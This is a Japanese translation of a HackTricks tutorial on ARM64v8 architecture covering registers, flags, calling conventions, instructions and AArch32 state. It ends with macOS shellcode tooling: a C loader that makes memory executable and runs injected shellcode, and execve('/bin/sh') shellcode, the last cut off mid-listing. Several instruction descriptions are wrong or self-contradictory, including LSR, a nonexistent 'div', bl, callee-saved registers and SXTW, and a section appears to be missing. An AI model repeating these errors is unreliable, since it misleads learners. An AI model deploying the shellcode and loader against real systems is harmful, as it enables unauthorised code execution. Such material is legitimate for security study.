# ARM64v8への導入

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- 💬 **Discordグループ**に参加する](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)をフォローする。
- **ハッキングトリックを共有する**には、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>

## **例外レベル - EL（ARM64v8）**

ARMv8アーキテクチャでは、実行レベルである例外レベル（EL）が、実行環境の特権レベルと機能を定義します。EL0からEL3までの4つの例外レベルがあり、それぞれ異なる目的で使用されます：

1. **EL0 - ユーザーモード**：
   - これは最も特権のないレベルであり、通常のアプリケーションコードの実行に使用されます。
   - EL0で実行されるアプリケーションは、お互いやシステムソフトウェアから分離されており、セキュリティと安定性が向上しています。
2. **EL1 - オペレーティングシステムカーネルモード**：
   - ほとんどのオペレーティングシステムカーネルはこのレベルで実行されます。
   - EL1はEL0よりも特権があり、システムリソースにアクセスできますが、システムの整合性を確保するためにいくつかの制限があります。
3. **EL2 - ハイパーバイザーモード**：
   - このレベルは仮想化に使用されます。EL2で実行されるハイパーバイザーは、同じ物理ハードウェア上で実行されている複数のオペレーティングシステム（それぞれが独自のEL1で）を管理できます。
   - EL2には仮想環境の分離と制御の機能が提供されます。
4. **EL3 - セキュアモニターモード**：
   - これは最も特権のあるレベルであり、セキュアブートや信頼された実行環境によく使用されます。
   - EL3はセキュア状態と非セキュア状態のアクセスを管理および制御できます（セキュアブート、信頼されたOSなど）。

これらのレベルの使用により、ユーザーアプリケーションから最も特権のあるシステムソフトウェアまで、システムのさまざまな側面を構造化して安全に管理する方法が提供されます。ARMv8の特権レベルへのアプローチは、異なるシステムコンポーネントを効果的に分離することで、システムのセキュリティと堅牢性を向上させるのに役立ちます。

## **レジスタ（ARM64v8）**

ARM64には、`x0`から`x30`までの**31個の汎用レジスタ**があります。それぞれが**64ビット**（8バイト）の値を格納できます。32ビットの値のみを必要とする操作の場合、同じレジスタには`w0`から`w30`という名前で32ビットモードでアクセスできます。

1. **`x0`** から **`x7`** - これらは通常、スクラッチレジスタとサブルーチンにパラメータを渡すために使用されます。
   - **`x0`** は関数の戻りデータも保持します。
2. **`x8`** - Linuxカーネルでは、`x8`は`svc`命令のシステムコール番号として使用されます。**macOSではx16が使用されます！**
3. **`x9`** から **`x15`** - さらに一時レジスタであり、ローカル変数によく使用されます。
4. **`x16`** と **`x17`** - **手続き内呼び出しレジスタ**。即値のための一時レジスタ。間接関数呼び出しやPLT（手続きリンクテーブル）スタブにも使用されます。
   - **macOS**では、**`x16`** が **`svc`** 命令の **システムコール番号**として使用されます。
5. **`x18`** - **プラットフォームレジスタ**。一般目的レジスタとして使用できますが、一部のプラットフォームでは、このレジスタはプラットフォーム固有の用途に予約されています：Windowsでは現在のスレッド環境ブロックへのポインタ、Linuxカーネルでは現在の**実行中のタスク構造体を指す**ためのポインタ。
6. **`x19`** から **`x28`** - これらは呼び出し元保存レジスタです。関数はこれらのレジスタの値を呼び出し元のために保存する必要があり、それらはスタックに保存され、呼び出し元に戻る前に回復されます。
7. **`x29`** - スタックフレームを追跡するための**フレームポインタ**。関数が呼び出されると新しいスタックフレームが作成されるとき、**`x29`** レジスタはスタックに保存され、新しいフレームポインタアドレス（**`sp`**アドレス）がこのレジスタに保存されます。
   - このレジスタは一般目的レジスタとして使用できますが、通常は**ローカル変数の参照**として使用されます。
8. **`x30`** または **`lr`** - **リンクレジスタ**。`BL`（Branch with Link）または`BLR`（Registerを使用したBranch with Link）命令が実行されるときに**リターンアドレス**を保持します。
   - 他のレジスタと同様に使用できます。
9. **`sp`** - **スタックポインタ**。スタックの先頭を追跡するために使用されます。
   - **`sp`** の値は常に**クワッドワードのアライメント**を保持する必要があり、それ以外の場合はアライメント例外が発生する可能性があります。
10. **`pc`** - 次の命令を指す**プログラムカウンタ**。このレジスタは例外生成、例外リターン、および分岐を介してのみ更新できます。このレジスタを読み取ることができる通常の命令は、`pc`アドレスをこのレジスタに格納するためのブランチリンク命令（BL、BLR）のみです。
11. **`xzr`** - **ゼロレジスタ**。32ビットレジスタ形式では**`wzr`**とも呼ばれます。ゼロ値を簡単に取得するために使用できます（一般的な操作）または**`subs`**を使用して比較を実行するために使用できます。**`xzr`**に結果データを保存しないでください。

**`Wn`** レジスタは **`Xn`** レジスタの32ビットバージョンです。

### SIMDおよび浮動小数点レジスタ

さらに、最適化された単一命令複数データ（SIMD）操作や浮動小数点演算を実行するために使用できる、128ビット長の**32個のレジスタ**があります。これらはVnレジスタと呼ばれますが、64ビット、32ビット、16ビット、8ビットで動作することもあり、その場合は**`Qn`**、**`Dn`**、**`Sn`**、**`Hn`**、**`Bn`**と呼ばれます。

### システムレジスタ

**数百のシステムレジスタ**、特別用途レジスタ（SPR）とも呼ばれ、**プロセッサの動作を監視**および**制御**するために使用されます。\
これらは、専用の特別な命令**`mrs`**および**`msr`**を使用してのみ読み取りまたは設定できます。

特別レジスタ**`TPIDR_EL0`**および**`TPIDDR_EL0`**は、リバースエンジニアリング時に一般的に見られます。`EL0`接尾辞は、レジスタにアクセスできる**最小例外**を示します（この場合、EL0は通常の例外（特権）レベルで、通常のプログラムが実行されます）。\
これらは通常、メモリのスレッドローカルストレージ領域の**基本アドレス**を格納するために使用されます。通常、最初のものはEL0で実行されるプログラムに対して読み取り可能で書き込み可能ですが、2番目はEL0から読み取り可能でEL1から書き込み可能です（カーネルのような）。
### **PSTATE**

**PSTATE**には、オペレーティングシステムで見える**`SPSR_ELx`**特殊レジスタにシリアル化されたいくつかのプロセスコンポーネントが含まれており、Xはトリガーされた例外の**権限**レベルを表しています（これにより、例外が終了するとプロセスの状態を回復できます）。\
これらはアクセス可能なフィールドです：

<figure><img src="../../../.gitbook/assets/image (724).png" alt=""><figcaption></figcaption></figure>

* **`N`**、**`Z`**、**`C`**、**`V`**条件フラグ：
* **`N`**は操作が負の結果を生じたことを意味します
* **`Z`**は操作がゼロを生じたことを意味します
* **`C`**は操作がキャリーしたことを意味します
* **`V`**は操作が符号オーバーフローを生じたことを意味します：
* 2つの正の数の合計は負の結果を生じます。
* 2つの負の数の合計は正の結果を生じます。
* 減算では、大きな負の数が小さな正の数から減算される場合（またはその逆）、結果が与えられたビットサイズの範囲内に表現できない場合。
* 明らかに、プロセッサは操作が符号付きかどうかを知らないため、符号が付いているかどうかをチェックし、符号が付いている場合にはCとVを確認し、キャリーが発生したかどうかを示します。

{% hint style="warning" %}
すべての命令がこれらのフラグを更新するわけではありません。**`CMP`**や**`TST`**のような一部の命令は、**`ADDS`**のようなsサフィックスを持つ他の命令も更新します。
{% endhint %}

* 現在の**レジスタ幅（`nRW`）**フラグ：フラグが値0を保持している場合、プログラムは再開時にAArch64実行状態で実行されます。
* 現在の**例外レベル（`EL`）**：EL0で実行される通常のプログラムは値0になります
* **シングルステップ**フラグ（**`SS`**）：デバッガが**`SPSR_ELx`**内のSSフラグを1に設定してシングルステップを行うために使用します。プログラムはステップを実行し、シングルステップ例外を発行します。
* **不正例外**状態フラグ（**`IL`**）：特権ソフトウェアが無効な例外レベル転送を実行するときにマークされ、このフラグが1に設定され、プロセッサは不正な状態例外をトリガーします。
* **`DAIF`**フラグ：これらのフラグを使用すると、特権プログラムは特定の外部例外を選択的にマスクできます。
* **`A`**が1の場合、**非同期中断**がトリガーされます。**`I`**は外部ハードウェアの**割り込みリクエスト**（IRQ）に応答するように構成され、Fは**高速割り込みリクエスト**（FIRs）に関連しています。
* **スタックポインタ選択**フラグ（**`SPS`**）：EL1以上で実行される特権プログラムは、自分自身のスタックポインタレジスタとユーザーモデルのレジスタ（たとえば、`SP_EL1`と`EL0`の間）を切り替えることができます。この切り替えは、**`SPSel`**特殊レジスタに書き込むことによって実行されます。これはEL0からは行えません。

## **呼び出し規約（ARM64v8）**

ARM64呼び出し規約では、関数への最初の8つのパラメータは**`x0`から`x7`**のレジスタに渡されます。**追加**のパラメータは**スタック**に渡されます。**戻り値**は、レジスタ**`x0`**に戻されるか、128ビットの場合は**`x1`**にも戻されます。**`x19`**から**`x30`**および**`sp`**レジスタは、関数呼び出しを超えて**保存**される必要があります。

アセンブリで関数を読む際には、**関数のプロローグとエピローグ**を探します。**プロローグ**では通常、**フレームポインタ（`x29`）**の**保存**、**新しいフレームポインタの設定**、**スタックスペースの割り当て**が行われます。**エピローグ**では通常、**保存されたフレームポインタの復元**と**関数からの戻り**が行われます。

### Swiftの呼び出し規約

Swiftには独自の**呼び出し規約**があり、[**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)で見つけることができます。

## **一般的な命令（ARM64v8）**

ARM64命令は一般的に、`opcode dst, src1, src2`の形式を持ち、**`opcode`**は実行される**操作**（`add`、`sub`、`mov`など）を示し、**`dst`**は結果が格納される**宛先**レジスタであり、**`src1`**と**`src2`**は**ソース**レジスタです。ソースレジスタの代わりに即値を使用することもできます。

* **`mov`**: 1つの**レジスタ**から別の**レジスタ**に値を**移動**します。
* 例: `mov x0, x1` — これは`x1`から`x0`に値を移動します。
* **`ldr`**: **メモリ**から値を**レジスタ**に**ロード**します。
* 例: `ldr x0, [x1]` — これは`x1`が指すメモリ位置から`x0`に値をロードします。
* **オフセットモード**: オフセットは、元のポインタに影響を与えるもので、例えば:
* `ldr x2, [x1, #8]`は、x1 + 8からx2に値をロードします
* `ldr x2, [x0, x1, lsl #2]`は、x0の配列からx1（インデックス）\* 4の位置にあるオブジェクトをx2にロードします
* **プリインデックスモード**: これは、元の計算を適用し、結果を取得して新しい元を元に格納します。
* `ldr x2, [x1, #8]!`は、`x1 + 8`を`x2`にロードし、`x1 + 8`の結果をx1に格納します
* `str lr, [sp, #-4]!`は、リンクレジスタをspに格納し、レジスタspを更新します
* **ポストインデックスモード**: これは前のモードと同様ですが、メモリアドレスにアクセスしてからオフセットを計算して格納します。
* `ldr x0, [x1], #8`は、`x1`を`x0`にロードし、`x1 + 8`でx1を更新します
* **PC相対アドレッシング**: この場合、ロードするアドレスはPCレジスタに対して相対的に計算されます
* `ldr x1, =_start`は、`_start`シンボルが開始するアドレスを、現在のPCに関連してx1にロードします。
* **`str`**: **レジスタ**から**メモリ**に値を**ストア**します。
* 例: `str x0, [x1]` — これは`x0`の値を`x1`が指すメモリ位置にストアします。
* **`ldp`**: **2つのレジスタ**を**連続するメモリ**から**ロード**します。メモリアドレスは通常、別のレジスタの値にオフセットを追加して形成されます。
* 例: `ldp x0, x1, [x2]` — これは、それぞれ`x2`と`x2 + 8`のメモリ位置から`x0`と`x1`をロードします。
* **`stp`**: **2つのレジスタ**を**連続するメモリ**に**ストア**します。メモリアドレスは通常、別のレジスタの値にオフセットを追加して形成されます。
* 例: `stp x0, x1, [sp]` — これは、それぞれ`sp`と`sp + 8`のメモリ位置に`x0`と`x1`をストアします。
* `stp x0, x1, [sp, #16]!` — これは、それぞれ`sp+16`と`sp + 24`のメモリ位置に`x0`と`x1`をストアし、`sp`を`sp+16`で更新します。
* **`add`**: 2つのレジスタの値を加算し、結果をレジスタに格納します。
* 構文: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
* Xn1 -> 宛先
* Xn2 -> オペランド1
* Xn3 | #imm -> オペランド2（レジスタまたは即値）
* \[shift #N | RRX] -> シフトを実行するか、RRXを呼び出す
* 例: `add x0, x1, x2` — これは`x1`と`x2`の値を加算し、結果を`x0`に格納します。
* `add x5, x5, #1, lsl #12` — これは4096に等しい（1を12回シフト） -> 1 0000 0000 0000 0000
* **`adds`** これは`add`を実行し、フラグを更新します
* **`sub`**: 2つのレジスタの値を減算し、結果をレジスタに格納します。
* **`add`**の**構文**を確認してください。
* 例: `sub x0, x1, x2` — これは`x1`から`x2`の値を引き、結果を`x0`に格納します。
* **`subs`** これは`sub`と同じですが、フラグを更新します
* **`mul`**: **2つのレジスタ**の値を**掛け算**し、結果をレジスタに格納します。
* 例: `mul x0, x1, x2` — これは`x1`と`x2`の値を掛け算し、結果を`x0`に格納します。
* **`div`**: 1つのレジスタの値をもう1つで割り、結果をレジスタに格納します。
* 例: `div x0, x1, x2` — これは`x1`を`x2`で割り、結果を`x0`に格納します。
* **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
* **Logical shift left**: 末尾から0を追加し、他のビットを前に移動します（n回2を掛ける）
* **Logical shift right**: 先頭に1を追加し、他のビットを後ろに移動します（符号なしでn回2で割る）
* **Arithmetic shift right**: **`lsr`**と同様ですが、最上位ビットが1の場合、0を追加する代わりに1を追加します（符号つきでn回2で割る）
* **Rotate right**: **`lsr`**と同様ですが、右から削除されたものは左に追加されます
* **Rotate Right with Extend**: **`ror`**と同様ですが、キャリーフラグを「最上位ビット」として使用します。つまり、キャリーフラグがビット31に移動し、削除されたビットがキャリーフラグに移動します。
* **`bfm`**: **ビットフィールドムーブ**、これらの操作は値からビット`0...n`をコピーし、それらを位置`m..m+n`に配置します。**`#s`**は**左端のビット**位置を指定し、**`#r`**は**右に回転する量**を指定します。
* ビットフィールドムーブ: `BFM Xd, Xn, #r`
* 符号付きビットフィールドムーブ: `SBFM Xd, Xn, #r, #s`
* 符号なしビットフィールドムーブ: `UBFM Xd, Xn, #r, #s`
* **ビットフィールドの抽出と挿入:** レジスタからビットフィールドをコピーし、別のレジスタにコピーします。
* **`BFI X1, X2, #3, #4`** X2からX1の3番目のビットに4ビットを挿入します
* **`BFXIL X1, X2, #3, #4`** X2の3番目のビットから4ビットを抽出し、それらをX1にコピーします
* **`SBFIZ X1, X2, #3, #4`** X2から4ビットを符号拡張し、X1の3ビット目から挿入し、右のビットをゼロにします
* **`SBFX X1, X2, #3, #4`** X2から3ビット目から4ビットを抽出し、符号拡張し、結果をX1に配置します
* **`UBFIZ X1, X2, #3, #4`** X2から4ビットをゼロ拡張し、X1の3ビット目から挿入し、右のビットをゼロにします
* **`UBFX X1, X2, #3, #4`** X2から3ビット目から4ビットを抽出し、ゼロ拡張された結果をX1に配置します。
* **Xに符号拡張:** 値の符号を拡張します（または符号なしバージョンでは単に0を追加します）:
* **`SXTB X1, W2`** 64ビットを埋めるために、バイトの符号を**W2からX1**に拡張します（`W2`は`X2`の半分です）
* **`SXTH X1, W2`** 16ビット数の符号を**W2からX1**に拡張して64ビットを埋めます
* **`SXTW X1, W2`** バイトの符号を**W2からX1**に拡張して64ビットを埋めます
* **`UXTB X1, W2`** 0を追加します（符号なし）バイトの**W2からX1**に64ビットを埋めます
* **`extr`:** 指定された**連結されたレジスタのビット**を抽出します。
* 例: `EXTR W3, W2, W1, #3` これは**W1+W2**を連結し、**W2のビット3からW1のビット3まで**を取得してW3に格納します。
* **`cmp`**: 2つのレジスタを比較し、条件フラグを設定します。`subs`のエイリアスで、宛先レジスタをゼロレジスタに設定します。`m == n`かどうかを知るのに便利です。
* **`subs`**と同じ構文をサポートします
* 例: `cmp x0, x1` — これは`x0`と`x1`の値を比較し、条件フラグを適切に設定します。
* **`cmn`**: **負の比較**オペランド。この場合、`adds`のエイリアスで、同じ構文をサポートします。`m == -n`かどうかを知るのに便利です。
* **`ccmp`**: 条件付き比較、前の比較が真の場合にのみ実行され、特定のnzcvビットが設定されます。
* `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> x1 != x2かつx3 < x4の場合、funcにジャンプします
* これは**前の`cmp`が`NE`だった場合にのみ`ccmp`が実行**されるためで、そうでない場合はビット`nzcv`が0に設定されます（`blt`比較を満たしません）。
* これは`ccmn`としても使用できます（`cmp`と`cmn`のように）。
* **`tst`**: 比較の値のいずれかが1であるかどうかをチェックします（結果をどこにも保存せずにANDSのように機能します）。指定された値のレジスタをチェックし、その値で示されるレジスタのビットのいずれかが1かどうかを確認するのに便利です。
* 例: `tst X1, #7` X1の最後の3ビットのいずれかが1かどうかをチェックします
* **`teq`**: 結果を破棄するXOR演算
* **`b`**: 無条件分岐
* 例: `b myFunction`&#x20;
* これはリンクレジスタに戻りアドレスを格納しません（戻る必要のあるサブルーチン呼び出しには適していません）
* **`bl`**: **リンク付き分岐**、**サブルーチン**を**呼び出す**ために使用されます。**`x30`に戻りアドレスを格納**します。
* 例: `bl myFunction` — これは`myFunction`関数を呼び出し、戻りアドレスを`x30`に格納します。
* これはリンクレジスタに戻りアドレスを格納しません（戻る必要のあるサブルーチン呼び出しには適していません）
* **`blr`**: **レジスタへのリンク付き分岐**、**レジスタ**に**指定された**ターゲットを持つ**サブルーチン**を**呼び出す**ために使用されます。戻りアドレスを`x30`に格納します。（これは&#x20;
* 例: `blr x1` — これは`x1`に含まれるアドレスの関数を呼び出し、戻りアドレスを`x30`に格納します。
* **`ret`**: **サブルーチン**から**戻る**、通常は**`x30`**のアドレスを使用します。
* 例: `ret` — これは`x30`に格納された戻りアドレスを使用して現在のサブルーチンから戻ります。
* **`b.<cond>`**: 条件付き分岐
* **`b.eq`**: **等しい場合に分岐**、前の`cmp`命令に基づきます。
* 例: `b.eq label` — 前の`cmp`命令で2つの等しい値が見つかった場合、`label`にジャンプします。
* **`b.ne`**: **等しくない場合に分岐**。この命令は条件フラグをチェックし（前の比較命令で設定された）、比較された値が等しくない場合、ラベルまたはアドレスに分岐します。
* 例: `cmp x0, x1`の後、`b.ne label` — `x0`と`x1`の値が等しくない場合、`label`にジャンプします。
* **`cbz`**: **ゼロの場合に比較して分岐**します。この命令はレジスタをゼロと比較し、等しい場合はラベルまたはアドレスに分岐します。
* 例: `cbz x0, label` — `x0`の値がゼロの場合、`label`にジャンプします。
* **`cbnz`**: **ゼロ以外の場合に比較して分岐**します。この命令はレジスタをゼロと比較し、等しくない場合はラベルまたはアドレスに分岐します。
* 例: `cbnz x0, label` — もし `x0` の値がゼロでない場合、`label` にジャンプする。
* **`tbnz`**: ビットをテストし、ゼロでない場合に分岐
* 例: `tbnz x0, #8, label`
* **`tbz`**: ビットをテストし、ゼロの場合に分岐
* 例: `tbz x0, #8, label`
* **条件付き選択演算**: 条件付きビットによって挙動が異なる演算です。
* `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> 真の場合、X0 = X1、偽の場合、X0 = X2
* `csinc Xd, Xn, Xm, cond` -> 真の場合、Xd = Xn、偽の場合、Xd = Xm + 1
* `cinc Xd, Xn, cond` -> 真の場合、Xd = Xn + 1、偽の場合、Xd = Xn
* `csinv Xd, Xn, Xm, cond` -> 真の場合、Xd = Xn、偽の場合、Xd = NOT(Xm)
* `cinv Xd, Xn, cond` -> 真の場合、Xd = NOT(Xn)、偽の場合、Xd = Xn
* `csneg Xd, Xn, Xm, cond` -> 真の場合、Xd = Xn、偽の場合、Xd = - Xm
* `cneg Xd, Xn, cond` -> 真の場合、Xd = - Xn、偽の場合、Xd = Xn
* `cset Xd, Xn, Xm, cond` -> 真の場合、Xd = 1、偽の場合、Xd = 0
* `csetm Xd, Xn, Xm, cond` -> 真の場合、Xd = \<all 1>、偽の場合、Xd = 0
* **`adrp`**: シンボルの **ページアドレスを計算** し、レジスタに格納します。
* 例: `adrp x0, symbol` — `symbol` のページアドレスを計算し、`x0` に格納します。
* **`ldrsw`**: メモリから符号付き **32ビット** 値を **ロード** し、64ビットに **符号拡張** します。
* 例: `ldrsw x0, [x1]` — `x1` が指すメモリ位置から符号付き32ビット値をロードし、64ビットに符号拡張して `x0` に格納します。
* **`stur`**: レジスタの値をメモリ位置に **ストア** し、他のレジスタからのオフセットを使用します。
* 例: `stur x0, [x1, #4]` — `x1` に現在のアドレスより4バイト大きいアドレスに `x0` の値を格納します。
* **`svc`** : **システムコール** を行います。"Supervisor Call" の略で、プロセッサがこの命令を実行すると、**ユーザーモードからカーネルモードに切り替わり**、**カーネルのシステムコール処理** コードがある特定のメモリ位置にジャンプします。
*   例:

```armasm
mov x8, 93  ; レジスタ x8 に終了のためのシステムコール番号 (93) をロードします。
mov x0, 0   ; 終了ステータスコード (0) をレジスタ x0 にロードします。
svc 0       ; システムコールを行います。
```

### **関数プロローグ**

1. **リンクレジスタとフレームポインタをスタックに保存**:

{% code overflow="wrap" %}
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
{% endcode %}

2. **新しいフレームポインタを設定する**: `mov x29, sp` (現在の関数のために新しいフレームポインタを設定する)
3. **ローカル変数のためにスタック上にスペースを割り当てる**（必要な場合）: `sub sp, sp, <size>`（ここで `<size>` は必要なバイト数です）

### **関数エピローグ**

1. **ローカル変数を解放する（割り当てられている場合）**: `add sp, sp, <size>`
2. **リンクレジスタとフレームポインタを復元する**:

{% code overflow="wrap" %}
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
{% endcode %}

3. **Return**: `ret`（リンクレジスタ内のアドレスを使用して呼び出し元に制御を返します）

## AARCH32 実行状態

Armv8-A は 32 ビットプログラムの実行をサポートします。**AArch32** は **`A32`** と **`T32`** の **2 つの命令セット**のいずれかで実行でき、**`interworking`** を介してそれらの間を切り替えることができます。\
**特権を持つ** 64 ビットプログラムは、例外レベルの転送を実行することで、**32 ビットの低特権プログラムの実行をスケジュール**できます。\
64 ビットから 32 ビットへの移行は、例外レベルの低下によって行われます（たとえば、EL1 での 64 ビットプログラムが EL0 でのプログラムをトリガーする場合）。これは、`AArch32` プロセススレッドが実行される準備ができたときに、**`SPSR_ELx`** 特殊レジスタの **ビット 4 を 1 に設定**することで行われ、`SPSR_ELx` の残りの部分は **`AArch32`** プログラムの CPSR を格納します。その後、特権プロセスは **`ERET`** 命令を呼び出してプロセッサが **`AArch32`** に遷移し、CPSR に応じて A32 または T32 に入ります\*\*。\*\*

**`interworking`** は CPSR の J ビットと T ビットを使用して行われます。`J=0` かつ `T=0` は **`A32`** を意味し、`J=0` かつ `T=1` は **T32** を意味します。これは基本的に、命令セットが T32 であることを示すために **最下位ビットを 1 に設定**することを意味します。\
これは **interworking 分岐命令**中に設定されますが、PC が宛先レジスタとして設定されている場合、他の命令でも直接設定できます。例：

別の例：
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### レジスタ

32ビットのレジスタが16個あります（r0-r15）。**r0からr14**まで、**どんな操作にも使用**できますが、一部は通常予約されています：

- **`r15`**：プログラムカウンタ（常に）。次の命令のアドレスが格納されます。A32では現在+8、T32では現在+4です。
- **`r11`**：フレームポインタ
- **`r12`**：手続き内呼び出しレジスタ
- **`r13`**：スタックポインタ
- **`r14`**：リンクレジスタ

さらに、レジスタは**`バンクレジスタ`**にバックアップされます。これは、例外処理や特権操作で**高速なコンテキストスイッチング**を実行するために、レジスタの値を保存し、復元する必要がなくなるようにする場所です。\
これは、例外が発生すると、プロセッサの状態を**`CPSR`**から取り、例外が発生したプロセッサモードの**`SPSR`**に保存することで行われます。例外が返されると、**`CPSR`**は**`SPSR`**から復元されます。

### CPSR - 現在のプログラムステータスレジスタ

AArch32では、CPSRはAArch64の**`PSTATE`**と同様に機能し、例外が発生すると後で実行を復元するために**`SPSR_ELx`**にも保存されます：

<figure><img src="../../../.gitbook/assets/image (725).png" alt=""><figcaption></figcaption></figure>

フィールドはいくつかのグループに分かれています：

- アプリケーションプログラムステータスレジスタ（APSR）：算術フラグで、EL0からアクセス可能
- 実行状態レジスタ：プロセスの動作（OSによって管理されます）。

#### アプリケーションプログラムステータスレジスタ（APSR）

- **`N`**、**`Z`**、**`C`**、**`V`** フラグ（AArch64と同様）
- **`Q`** フラグ：専用の飽和算術命令の実行中に**整数の飽和が発生する**ときに1に設定されます。一度**`1`**に設定されると、手動で0に設定されるまで値が維持されます。さらに、その値を暗黙的にチェックする命令は存在せず、値を読んで手動でチェックする必要があります。
- **`GE`**（以上または等しい）フラグ：これはSIMD（Single Instruction, Multiple Data）操作で使用され、"parallel add"や"parallel subtract"などの操作に使用されます。これらの操作は、1つの命令で複数のデータポイントを処理できます。

たとえば、**`UADD8`** 命令は、並列に4組のバイト（2つの32ビットオペランドから）を追加し、結果を32ビットレジスタに格納します。次に、これらの結果に基づいて、**`APSR`**の**`GE`** フラグが設定されます。各GEフラグは1つのバイトの追加に対応し、そのバイトのペアの追加が**オーバーフローしたかどうか**を示します。

**`SEL`** 命令は、これらのGEフラグを使用して条件付きアクションを実行します。

#### 実行状態レジスタ

- **`J`** および **`T`** ビット：**`J`** は0であるべきで、**`T`** が0の場合はA32命令セットが使用され、1の場合はT32が使用されます。
- **ITブロックステートレジスタ**（`ITSTATE`）：これらは10-15および25-26のビットです。**`IT`** で接頭辞が付いたグループ内の命令の条件を格納します。
- **`E`** ビット：**エンディアンネス**を示します。
- **モードおよび例外マスクビット**（0-4）：現在の実行状態を決定します。**5番目**のビットは、プログラムが32ビット（1）または64ビット（0）で実行されているかを示します。他の4つは、**使用中の例外モード**（例外が発生し処理されている場合）を表します。数値セットは、これが処理されている間に別の例外が発生した場合の**現在の優先度**を示します。

<figure><img src="../../../.gitbook/assets/image (728).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**：特定の例外は、**`A`**、`I`、`F` ビットを使用して無効にできます。**`A`** が1の場合、**非同期中断**がトリガーされます。**`I`** は外部ハードウェアの**割り込みリクエスト**（IRQ）に応答するように構成され、Fは**高速割り込みリクエスト**（FIR）に関連しています。
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% hint style="success" %}
時々、複数のシステムコール（BSDおよびMach）のコードがスクリプトを介して生成されるため、**`libsystem_kernel.dylib`** から**逆コンパイル**されたコードをチェックする方がソースコードをチェックするよりも簡単です。ソースコードのコメントを確認してください。一方、dylibでは呼び出されている内容を見つけることができます。
{% endhint %}

### シェルコード

コンパイルするには：
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
バイトを抽出するには：
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
<details>

<summary>シェルコードをテストするためのCコード</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### シェル

[**こちら**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s)から取得し、説明します。

{% tabs %}
{% tab title="adrを使用" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}

{% tab title="スタックを使用して" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
